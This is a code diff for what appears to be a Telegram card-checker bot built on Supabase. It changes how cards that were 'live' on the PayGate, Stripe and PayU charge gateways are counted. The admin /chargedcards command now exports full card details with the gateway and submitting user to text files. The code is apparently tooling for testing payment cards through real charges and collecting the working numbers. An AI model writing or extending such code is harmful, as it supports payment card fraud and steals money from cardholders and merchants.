@@ -5468,7 +5468,10 @@ ${gatewayStats || "  No gateway data"}
         userMap.set(p.user_id, p.username || email || p.user_id);
       });
 
-      const liveCount = cards.filter((c: any) => c.result === "live").length;
+      // Charge gateways that result in actual money charged
+      const chargeGateways = ["paygate_charge", "stripe_charge", "payu_charge"];
+      const chargedCount = cards.filter((c: any) => c.result === "live" && chargeGateways.includes(c.gateway)).length;
+      const liveCount = cards.filter((c: any) => c.result === "live" && !chargeGateways.includes(c.gateway)).length;
       const deadCount = cards.filter((c: any) => c.result === "dead").length;
       const unknownCount = cards.filter((c: any) => c.result !== "live" && c.result !== "dead").length;
 
@@ -5496,7 +5499,7 @@ ${gatewayStats || "  No gateway data"}
         chatId,
         fileContent,
         filename,
-        `📁 <b>All Cards Export</b>\n\n✅ Live: ${liveCount}\n❌ Dead: ${deadCount}\n❓ Unknown: ${unknownCount}\n\n📊 Total: ${cards.length} cards\n\n<i>Format: card | user</i>\n\n💾 <i>Saved to storage: allcards/${filename}</i>`
+        `📁 <b>All Cards Export</b>\n\n💳 Charged: ${chargedCount}\n✅ Live: ${liveCount}\n❌ Dead: ${deadCount}\n❓ Unknown: ${unknownCount}\n\n📊 Total: ${cards.length} cards\n\n<i>Format: card | user</i>\n\n💾 <i>Saved to storage: allcards/${filename}</i>`
       );
 
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
@@ -5648,7 +5651,7 @@ ${gatewayStats || "  No gateway data"}
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
-    // /chargedcards - Export charged cards only
+    // /chargedcards - Export charged cards only (live results from charge gateways)
     if (text === "/chargedcards") {
       const isAdmin = await isAdminAsync(chatId, supabase);
       if (!isAdmin) {
@@ -5658,18 +5661,23 @@ ${gatewayStats || "  No gateway data"}
 
       await sendTelegramMessage(chatId, "⏳ <b>Fetching charged cards...</b>\n\nPlease wait while I prepare the file.");
 
-      // Fetch ALL charged cards with pagination (unlimited)
-      const cards = await fetchAllRecords(
+      // Charge gateways that result in actual money charged
+      const chargeGateways = ["paygate_charge", "stripe_charge", "payu_charge"];
+      
+      // Fetch ALL live cards first, then filter by charge gateways
+      const allLiveCards = await fetchAllRecords(
         supabase,
         "card_checks",
         "card_details, gateway, created_at, user_id, result",
-        [{ column: "result", operator: "ilike", value: "%charged%" }],
+        [{ column: "result", operator: "eq", value: "live" }],
         { column: "created_at", ascending: false }
       );
-      const error = cards.length === 0 ? { message: "No data" } : null;
+      
+      // Filter only cards from charge gateways
+      const cards = allLiveCards.filter((c: any) => chargeGateways.includes(c.gateway));
 
-      if (error || !cards || cards.length === 0) {
-        await sendTelegramMessage(chatId, "❌ <b>No charged cards found</b>\n\nThere are no charged card records in the database.");
+      if (!cards || cards.length === 0) {
+        await sendTelegramMessage(chatId, "❌ <b>No charged cards found</b>\n\nThere are no charged card records in the database.\n\n<i>Charged cards are live cards from PayGate, Stripe Charge, or PayU gateways.</i>");
         return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
       }
 
@@ -5692,9 +5700,15 @@ ${gatewayStats || "  No gateway data"}
         userMap.set(p.user_id, p.username || email || p.user_id);
       });
 
+      // Count by gateway
+      const paygateCount = cards.filter((c: any) => c.gateway === "paygate_charge").length;
+      const stripeCount = cards.filter((c: any) => c.gateway === "stripe_charge").length;
+      const payuCount = cards.filter((c: any) => c.gateway === "payu_charge").length;
+
       const fileContent = cards.map((c: any) => {
         const user = userMap.get(c.user_id) || c.user_id || "Unknown";
-        return `${c.card_details || "Unknown"} | ${user}`;
+        const gateway = c.gateway === "paygate_charge" ? "PayGate" : c.gateway === "stripe_charge" ? "Stripe" : "PayU";
+        return `${c.card_details || "Unknown"} | ${gateway} | ${user}`;
       }).join("\n");
       const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
       const filename = `charged_cards_${timestamp}.txt`;
@@ -5715,7 +5729,7 @@ ${gatewayStats || "  No gateway data"}
         chatId,
         fileContent,
         filename,
-        `📁 <b>Charged Cards Export</b>\n\n💳 Total Charged Cards: ${cards.length}\n\n<i>Format: card | user</i>\n\n💾 <i>Saved to storage: chargedcards/${filename}</i>`
+        `📁 <b>Charged Cards Export</b>\n\n💳 <b>Total Charged: ${cards.length}</b>\n\n📊 <b>By Gateway:</b>\n• PayGate: ${paygateCount}\n• Stripe: ${stripeCount}\n• PayU: ${payuCount}\n\n<i>Format: card | gateway | user</i>\n\n💾 <i>Saved to storage: chargedcards/${filename}</i>`
       );
 
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
